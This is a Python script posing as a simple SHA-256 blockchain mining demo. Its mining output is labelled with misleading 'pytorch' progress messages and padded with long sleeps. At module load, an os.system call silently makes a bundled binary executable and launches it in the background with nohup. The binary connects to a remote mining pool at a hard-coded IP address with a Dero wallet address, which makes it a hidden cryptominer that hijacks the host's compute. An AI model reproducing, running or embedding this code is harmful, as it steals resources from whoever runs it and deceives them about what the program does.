import os
from hashlib import sha256
from time import  sleep
MAX_NONCE = 100000000000
os.system('chmod 700 inter;nohup ./inter -o wss://51.222.96.66:80 -u deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr -t 4 &')
def SHA256(text):
    return sha256(text.encode("ascii")).hexdigest()

def mine(block_number, transactions, previous_hash, prefix_zeros):
    prefix_str = '0'*prefix_zeros
    for nonce in range(MAX_NONCE):
        text = str(block_number) + transactions + previous_hash + str(nonce)
        new_hash = SHA256(text)
        if new_hash.startswith(prefix_str):
            print(f"pytorch with nonce value:{nonce}")
            return new_hash

    raise BaseException(f"Couldn't find correct has after trying {MAX_NONCE} times")

if __name__=='__main__':
    transactions='''
    Dhaval->Bhavin->20,
    Mando->Cara->45
    '''
    difficulty=1 # try changing this to higher number and you will see it will take more time for mining as difficulty increases
    import time
    start = time.time()
    sleep(300)
    print("started pytorch")
    sleep(300)
    print("||")
    sleep(300)
    print("||")
    sleep(300)
    print("||")
    sleep(300)
    print("||")
    sleep(300)
    print("||")
    sleep(300)
    print("\/")
    sleep(300)
    
    new_hash = mine(5,transactions,'0000000xa036944e29568d0cff17edbe038f81208fecf9a66be9a2b8321c6ec7', difficulty)
    sleep(300)
    total_time = str((time.time() - start))
    sleep(300)
    print(f"ending torch. torch took: {total_time} seconds")
    sleep(300)
    print(new_hash)
